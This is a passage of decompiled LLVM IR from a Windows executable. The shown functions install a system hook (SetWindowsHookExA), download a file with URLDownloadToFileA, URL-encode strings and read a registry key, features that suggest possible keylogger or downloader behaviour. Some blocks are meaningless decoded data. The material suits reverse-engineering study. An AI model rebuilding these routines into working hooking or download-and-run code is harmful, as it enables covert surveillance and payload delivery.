  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !636
  br i1 %10, label %dec_label_pc_404edd, label %dec_label_pc_404e6a, !insn.addr !636

dec_label_pc_404e6a:                              ; preds = %dec_label_pc_404e68
  br i1 %8, label %dec_label_pc_404ea0, label %dec_label_pc_404e6d, !insn.addr !637

dec_label_pc_404e6d:                              ; preds = %dec_label_pc_404e6a
  %11 = trunc i32 %4 to i16, !insn.addr !638
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !638
  %13 = inttoptr i32 %0 to i8*, !insn.addr !638
  store i8 %12, i8* %13, align 1, !insn.addr !638
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !639
  store i8 %14, i8* %13, align 1, !insn.addr !639
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !640
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !640
  %19 = add i8 %16, %18, !insn.addr !640
  %20 = inttoptr i32 %17 to i8*, !insn.addr !640
  store i8 %19, i8* %20, align 1, !insn.addr !640
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !641
  %21 = trunc i32 %arg10 to i16, !insn.addr !642
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !642
  %23 = inttoptr i32 %9 to i32*, !insn.addr !642
  store i32 %22, i32* %23, align 4, !insn.addr !642
  store i32 %arg1, i32* %eax, align 4, !insn.addr !643
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !644
  %25 = load i8, i8* %24, align 1, !insn.addr !644
  %26 = trunc i32 %arg1 to i8, !insn.addr !644
  %27 = add i8 %25, %26, !insn.addr !644
  store i8 %27, i8* %24, align 1, !insn.addr !644
  %28 = trunc i32 %arg3 to i16, !insn.addr !645
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !645
  %30 = load i32, i32* %29, align 4, !insn.addr !645
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !645
  %31 = add i32 %arg5, 67, !insn.addr !646
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !646
  %34 = load i32, i32* %33, align 4, !insn.addr !646
  %35 = load i8, i8* %24, align 1, !insn.addr !647
  %36 = add i8 %35, %26, !insn.addr !647
  store i8 %36, i8* %24, align 1, !insn.addr !647
  %37 = mul i32 %34, 1557718248, !insn.addr !648
  %38 = add i32 %arg7, 97, !insn.addr !648
  %39 = add i32 %38, %37, !insn.addr !648
  %40 = inttoptr i32 %39 to i8*, !insn.addr !648
  %41 = load i8, i8* %40, align 1, !insn.addr !648
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !648
  %44 = add i8 %43, %41, !insn.addr !648
  %45 = icmp eq i8 %44, 0, !insn.addr !648
  store i8 %44, i8* %40, align 1, !insn.addr !648
  br i1 %45, label %dec_label_pc_404f09, label %dec_label_pc_404e97, !insn.addr !649

dec_label_pc_404e97:                              ; preds = %dec_label_pc_404e6d
  %46 = load i32, i32* %eax, align 4, !insn.addr !650
  ret i32 %46, !insn.addr !650

dec_label_pc_404ea0:                              ; preds = %dec_label_pc_404e6a
  %47 = trunc i32 %6 to i8
  %48 = mul i32 %1, 256
  %49 = and i32 %48, 65280
  %50 = xor i32 %5, %49, !insn.addr !651
  %51 = bitcast i32* %eax to i8*
  %52 = mul i8 %47, 2, !insn.addr !652
  %53 = inttoptr i32 %6 to i8*, !insn.addr !652
  store i8 %52, i8* %53, align 1, !insn.addr !652
  %54 = add i32 %3, 104, !insn.addr !653
  %55 = inttoptr i32 %54 to i8*, !insn.addr !653
  %56 = load i8, i8* %55, align 1, !insn.addr !653
  %57 = udiv i32 %4, 256, !insn.addr !653
  %58 = trunc i32 %57 to i8, !insn.addr !653
  %59 = add i8 %56, %58, !insn.addr !653
  store i8 %59, i8* %55, align 1, !insn.addr !653
  %60 = trunc i32 %4 to i16, !insn.addr !654
  %61 = call i8 @__asm_insb(i16 %60), !insn.addr !654
  %62 = inttoptr i32 %0 to i8*, !insn.addr !654
  store i8 %61, i8* %62, align 1, !insn.addr !654
  %63 = call i8 @__asm_insb(i16 %60), !insn.addr !655
  store i8 %63, i8* %62, align 1, !insn.addr !655
  %64 = xor i32 %4, %1, !insn.addr !656
  %65 = call i8 @__asm_insb(i16 %60), !insn.addr !657
  store i8 %65, i8* %62, align 1, !insn.addr !657
  %66 = call i8 @__asm_insb(i16 %60), !insn.addr !658
  store i8 %66, i8* %62, align 1, !insn.addr !658
  %67 = load i8, i8* %55, align 1, !insn.addr !659
  %68 = trunc i32 %4 to i8, !insn.addr !659
  %69 = add i8 %67, %68, !insn.addr !659
  store i8 %69, i8* %55, align 1, !insn.addr !659
  %70 = call i8 @__asm_insb(i16 %60), !insn.addr !660
  store i8 %70, i8* %62, align 1, !insn.addr !660
  %71 = call i8 @__asm_insb(i16 %60), !insn.addr !661
  store i8 %71, i8* %62, align 1, !insn.addr !661
  %72 = add i32 %2, 117, !insn.addr !662
  %73 = inttoptr i32 %72 to i16*, !insn.addr !662
  %74 = load i16, i16* %73, align 2, !insn.addr !662
  %75 = trunc i32 %64 to i16, !insn.addr !662
  call void @__asm_arpl(i16 %74, i16 %75), !insn.addr !662
  %76 = load i8, i8* %51, align 4, !insn.addr !663
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !663
  %79 = add i8 %76, %78, !insn.addr !663
  %80 = inttoptr i32 %77 to i8*, !insn.addr !663
  store i8 %79, i8* %80, align 1, !insn.addr !663
  %81 = add i32 %50, 82, !insn.addr !664
  %82 = inttoptr i32 %81 to i8*, !insn.addr !664
  %83 = load i8, i8* %82, align 1, !insn.addr !664
  %84 = add i8 %83, %68, !insn.addr !664
  store i8 %84, i8* %82, align 1, !insn.addr !664
  %85 = load i32, i32* %eax, align 4, !insn.addr !665
  %86 = add i32 %85, -1, !insn.addr !665
  %87 = add i32 %50, 4227321, !insn.addr !666
  %88 = inttoptr i32 %87 to i8*, !insn.addr !666
  %89 = load i8, i8* %88, align 1, !insn.addr !666
  %90 = udiv i32 %86, 256, !insn.addr !666
  %91 = trunc i32 %90 to i8, !insn.addr !666
  %92 = add i8 %89, %91, !insn.addr !666
  store i8 %92, i8* %88, align 1, !insn.addr !666
  ret i32 %86, !insn.addr !666

dec_label_pc_404edd:                              ; preds = %dec_label_pc_404e68
  ret i32 %6, !insn.addr !667

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404e6d
  %93 = call i32 @CallNextHookEx(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !668
  ret i32 %93, !insn.addr !669
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_404f14:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4214516 to i32*), i32 3), !insn.addr !670
  %2 = ptrtoint i32* %1 to i32, !insn.addr !670
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !671
  %3 = icmp eq i32* %1, null, !insn.addr !672
  %4 = icmp eq i1 %3, false, !insn.addr !673
  %5 = sext i1 %4 to i32, !insn.addr !674
  ret i32 %5, !insn.addr !675
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_404f40:
  %0 = load i32, i32* @global_var_40969c, align 4, !insn.addr !676
  %1 = inttoptr i32 %0 to i32*, !insn.addr !677
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !677
  %3 = sext i1 %2 to i32, !insn.addr !677
  ret i32 %3, !insn.addr !678
}

define i32 @function_404f4c() local_unnamed_addr {
dec_label_pc_404f4c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !679
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !679
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !679
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !680
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !681
  %3 = add i32 %2, 1, !insn.addr !681
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !681
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !682
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !683
  ret i32 0, !insn.addr !684
}

define i32 @function_404f71() local_unnamed_addr {
dec_label_pc_404f71:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !685
  ret i32 %0, !insn.addr !685
}

define i32 @function_404f76() local_unnamed_addr {
dec_label_pc_404f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !686
}

define i32 @function_404f78(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !687
}

define i32 @function_404f7c() local_unnamed_addr {
dec_label_pc_404f7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !688
  %2 = add i32 %1, -1, !insn.addr !688
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !688
  ret i32 %0, !insn.addr !689
}

define i32 @function_404f84() local_unnamed_addr {
dec_label_pc_404f84:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !690
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !690
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !690
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !691
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !692
  %3 = add i32 %2, 1, !insn.addr !692
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !692
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !693
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !694
  ret i32 0, !insn.addr !695
}

define i32 @function_404fa9() local_unnamed_addr {
dec_label_pc_404fa9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !696
  ret i32 %0, !insn.addr !696
}

define i32 @function_404fae() local_unnamed_addr {
dec_label_pc_404fae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !697
}

define i32 @function_404fb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !698
}

define i32 @function_404fb4() local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !699
  %2 = add i32 %1, -1, !insn.addr !699
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !699
  ret i32 %0, !insn.addr !700
}

define i32 @function_404fbc() local_unnamed_addr {
dec_label_pc_404fbc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !701
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !701
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !701
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !702
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !703
  %3 = add i32 %2, 1, !insn.addr !703
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !703
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !704
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !705
  ret i32 0, !insn.addr !706
}

define i32 @function_404fe1() local_unnamed_addr {
dec_label_pc_404fe1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !707
  ret i32 %0, !insn.addr !707
}

define i32 @function_404fe6() local_unnamed_addr {
dec_label_pc_404fe6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !708
}

define i32 @function_404fe8(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fe8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !709
}

define i32 @function_404fec() local_unnamed_addr {
dec_label_pc_404fec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !710
  %2 = add i32 %1, -1, !insn.addr !710
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !710
  ret i32 %0, !insn.addr !711
}

define i32 @function_404ff4(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ff4:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !712
  ret i32 %0, !insn.addr !712
}

define i32 @function_404ffc() local_unnamed_addr {
dec_label_pc_404ffc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !713
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !713
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !713
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !714
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !715
  %3 = add i32 %2, 1, !insn.addr !715
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !715
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !716
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !717
  ret i32 0, !insn.addr !718
}

define i32 @function_405021() local_unnamed_addr {
dec_label_pc_405021:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !719
  ret i32 %0, !insn.addr !719
}

define i32 @function_405026() local_unnamed_addr {
dec_label_pc_405026:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !720
}

define i32 @function_405028(i32 %arg1) local_unnamed_addr {
dec_label_pc_405028:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !721
}

define i32 @function_40502c() local_unnamed_addr {
dec_label_pc_40502c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !722
  %2 = add i32 %1, -1, !insn.addr !722
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !722
  ret i32 %0, !insn.addr !723
}

define i32 @function_405034() local_unnamed_addr {
dec_label_pc_405034:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !724
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_405038, label %dec_label_pc_405041, !insn.addr !725

dec_label_pc_405038:                              ; preds = %dec_label_pc_405034
  %4 = add nuw nsw i32 %3, 48, !insn.addr !726
  ret i32 %4, !insn.addr !727

dec_label_pc_405041:                              ; preds = %dec_label_pc_405034
  %5 = add nuw nsw i32 %3, 55, !insn.addr !728
  ret i32 %5, !insn.addr !729
}

define i32 @function_40504c() local_unnamed_addr {
dec_label_pc_40504c:
  %esp.2.reg2mem = alloca i32, !insn.addr !730
  %esp.1.reg2mem = alloca i32, !insn.addr !730
  %cf.0.reg2mem = alloca i1, !insn.addr !730
  %esi.0.reg2mem = alloca i32, !insn.addr !730
  %esp.0.reg2mem = alloca i32, !insn.addr !730
  %ebx.0.reg2mem = alloca i32, !insn.addr !730
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !731
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !732
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !732
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !732
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !733
  %4 = call i32 @"@LStrClr"(), !insn.addr !734
  %5 = call i32 @function_4034c8(), !insn.addr !735
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !736
  br i1 %6, label %dec_label_pc_40514d, label %dec_label_pc_405099.preheader, !insn.addr !736

dec_label_pc_405099.preheader:                    ; preds = %dec_label_pc_40504c
  %7 = add i32 %0, -1, !insn.addr !737
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_405099

dec_label_pc_405099:                              ; preds = %dec_label_pc_405099.preheader, %dec_label_pc_405145
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !737
  %9 = inttoptr i32 %8 to i8*, !insn.addr !737
  %10 = load i8, i8* %9, align 1, !insn.addr !737
  %11 = icmp eq i8 %10, 32, !insn.addr !737
  %12 = icmp eq i1 %11, false, !insn.addr !738
  br i1 %12, label %dec_label_pc_4050b4, label %dec_label_pc_4050a3, !insn.addr !738

dec_label_pc_4050a3:                              ; preds = %dec_label_pc_405099
  %13 = call i32 @"@LStrCat"(), !insn.addr !739
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !740
  br label %dec_label_pc_405145, !insn.addr !740

dec_label_pc_4050b4:                              ; preds = %dec_label_pc_405099
  %14 = icmp ult i8 %10, 32, !insn.addr !741
  br i1 %14, label %dec_label_pc_4050d7, label %dec_label_pc_4050be, !insn.addr !742

dec_label_pc_4050be:                              ; preds = %dec_label_pc_4050b4
  %15 = add i8 %10, -32, !insn.addr !743
  %16 = icmp ult i8 %15, 95, !insn.addr !744
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !745
  br i1 %17, label %dec_label_pc_4050cb, label %dec_label_pc_4050d5, !insn.addr !745

dec_label_pc_4050cb:                              ; preds = %dec_label_pc_4050be
  %18 = load i32, i32* inttoptr (i32 4215180 to i32*), align 4, !insn.addr !746
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !746
  %21 = shl i32 1, %20, !insn.addr !746
  %22 = and i32 %18, %21, !insn.addr !746
  %23 = icmp ne i32 %22, 0, !insn.addr !746
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !746
  br label %dec_label_pc_4050d5, !insn.addr !746

dec_label_pc_4050d5:                              ; preds = %dec_label_pc_4050be, %dec_label_pc_4050cb
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !747
  br i1 %24, label %dec_label_pc_40512c, label %dec_label_pc_4050d7, !insn.addr !747

dec_label_pc_4050d7:                              ; preds = %dec_label_pc_4050d5, %dec_label_pc_4050b4
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !748
  %27 = add i32 %esp.0.reload, -4, !insn.addr !749
  %28 = inttoptr i32 %27 to i32*, !insn.addr !749
  store i32 %26, i32* %28, align 4, !insn.addr !749
  %29 = add i32 %esp.0.reload, -8, !insn.addr !750
  %30 = inttoptr i32 %29 to i32*, !insn.addr !750
  store i32 ptrtoint (i32* @global_var_4051a0 to i32), i32* %30, align 4, !insn.addr !750
  %31 = call i32 @function_405034(), !insn.addr !751
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !752
  %33 = add i32 %esp.0.reload, -12, !insn.addr !753
  %34 = inttoptr i32 %33 to i32*, !insn.addr !753
  store i32 0, i32* %34, align 4, !insn.addr !753
  %35 = call i32 @function_405034(), !insn.addr !754
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !755
  %37 = add i32 %esp.0.reload, -16, !insn.addr !756
  %38 = inttoptr i32 %37 to i32*, !insn.addr !756
  store i32 0, i32* %38, align 4, !insn.addr !756
  %39 = call i32 @"@LStrCatN"(), !insn.addr !757
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !758
  br label %dec_label_pc_405145, !insn.addr !758

dec_label_pc_40512c:                              ; preds = %dec_label_pc_4050d5
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !759
  %41 = call i32 @"@LStrCat"(), !insn.addr !760
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !760
  br label %dec_label_pc_405145, !insn.addr !760

dec_label_pc_405145:                              ; preds = %dec_label_pc_40512c, %dec_label_pc_4050d7, %dec_label_pc_4050a3
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !761
  %43 = add i32 %esi.0.reload, -1, !insn.addr !762
  %44 = icmp eq i32 %43, 0, !insn.addr !762
  %45 = icmp eq i1 %44, false, !insn.addr !763
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !763
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !763
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !763
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !763
  br i1 %45, label %dec_label_pc_405099, label %dec_label_pc_40514d, !insn.addr !763

dec_label_pc_40514d:                              ; preds = %dec_label_pc_405145, %dec_label_pc_40504c
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !764
  %47 = load i32, i32* %46, align 4, !insn.addr !764
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !765
  %48 = add i32 %esp.2.reload, 8, !insn.addr !766
  %49 = inttoptr i32 %48 to i32*, !insn.addr !766
  store i32 4215159, i32* %49, align 4, !insn.addr !766
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !767
  %51 = call i32 @"@LStrClr"(), !insn.addr !768
  ret i32 %51, !insn.addr !769
}

define i32 @function_405170() local_unnamed_addr {
dec_label_pc_405170:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !770
  ret i32 %0, !insn.addr !770
}

define i32 @function_405175() local_unnamed_addr {
dec_label_pc_405175:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !771
}

define i32 @function_405177(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405177:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !772
}

define i32 @function_40519b() local_unnamed_addr {
dec_label_pc_40519b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !773
  %2 = inttoptr i32 %0 to i32*, !insn.addr !773
  store i32 %1, i32* %2, align 4, !insn.addr !773
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !774
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !774
  %7 = add i8 %4, %6, !insn.addr !774
  %8 = inttoptr i32 %5 to i8*, !insn.addr !774
  store i8 %7, i8* %8, align 1, !insn.addr !774
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !775
  %10 = load i32, i32* %eax, align 4, !insn.addr !775
  %11 = udiv i32 %10, 256, !insn.addr !775
  %12 = trunc i32 %11 to i8, !insn.addr !775
  %13 = add i8 %9, %12, !insn.addr !775
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !775
  %14 = call i32 @function_4036b8(), !insn.addr !776
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !777
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !777
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !777
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !778
  %17 = call i32 @"@LStrCatN"(), !insn.addr !779
  %18 = call i32 @function_4036c8(), !insn.addr !780
  %19 = inttoptr i32 %18 to i32*, !insn.addr !781
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !781
  call void @__writefsdword(i32 0, i32 0), !insn.addr !782
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !783
  ret i32 %21, !insn.addr !784
}

define i32 @function_4051a4() local_unnamed_addr {
dec_label_pc_4051a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405212() local_unnamed_addr {
dec_label_pc_405212:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !785
  ret i32 %0, !insn.addr !785
}

define i32 @function_405217() local_unnamed_addr {
dec_label_pc_405217:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !786
}

define i32 @function_405219(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405219:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !787
}

define i32 @function_405223() local_unnamed_addr {
dec_label_pc_405223:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !788
  %5 = inttoptr i32 %3 to i32*, !insn.addr !788
  store i32 %4, i32* %5, align 4, !insn.addr !788
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !789
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !789
  %10 = add i8 %7, %9, !insn.addr !789
  %11 = inttoptr i32 %8 to i8*, !insn.addr !789
  store i8 %10, i8* %11, align 1, !insn.addr !789
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !790
  %14 = udiv i32 %1, 256, !insn.addr !790
  %15 = trunc i32 %14 to i8, !insn.addr !790
  %16 = add i8 %13, %15, !insn.addr !790
  %17 = load i32, i32* %edi, align 4, !insn.addr !790
  %18 = inttoptr i32 %17 to i8*, !insn.addr !790
  store i8 %16, i8* %18, align 1, !insn.addr !790
  %19 = load i8, i8* %6, align 4, !insn.addr !791
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !791
  %22 = add i8 %19, %21, !insn.addr !791
  %23 = inttoptr i32 %20 to i8*, !insn.addr !791
  store i8 %22, i8* %23, align 1, !insn.addr !791
  %24 = add i32 %0, -117, !insn.addr !792
  %25 = inttoptr i32 %24 to i8*, !insn.addr !792
  %26 = load i8, i8* %25, align 1, !insn.addr !792
  %27 = trunc i32 %2 to i8, !insn.addr !792
  %28 = add i8 %26, %27, !insn.addr !792
  store i8 %28, i8* %25, align 1, !insn.addr !792
  %29 = trunc i32 %2 to i16, !insn.addr !793
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !793
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !794
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !794
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !794
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !795
  %33 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !796
  %34 = add i32 %33, 1, !insn.addr !796
  store i32 %34, i32* @global_var_4096ac, align 4, !insn.addr !796
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !797
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !798
  ret i32 0, !insn.addr !799
}

define i32 @function_405251() local_unnamed_addr {
dec_label_pc_405251:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !800
  ret i32 %0, !insn.addr !800
}

define i32 @function_405256() local_unnamed_addr {
dec_label_pc_405256:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !801
}

define i32 @function_405258(i32 %arg1) local_unnamed_addr {
dec_label_pc_405258:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !802
}

define i32 @function_40525c() local_unnamed_addr {
dec_label_pc_40525c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !803
  %2 = add i32 %1, -1, !insn.addr !803
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !803
  ret i32 %0, !insn.addr !804
}

define i32 @function_405264() local_unnamed_addr {
dec_label_pc_405264:
  %eax.0.reg2mem = alloca i32, !insn.addr !805
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !806
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !807
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !808
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_4052f0, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !809
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_4052f0, i32 0, i32 0), i32 -2147483647), !insn.addr !810
  %2 = icmp eq i32 %1, 0, !insn.addr !811
  %3 = icmp eq i1 %2, false, !insn.addr !812
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !812
  br i1 %3, label %dec_label_pc_4052de, label %dec_label_pc_405299, !insn.addr !812

dec_label_pc_405299:                              ; preds = %dec_label_pc_405264
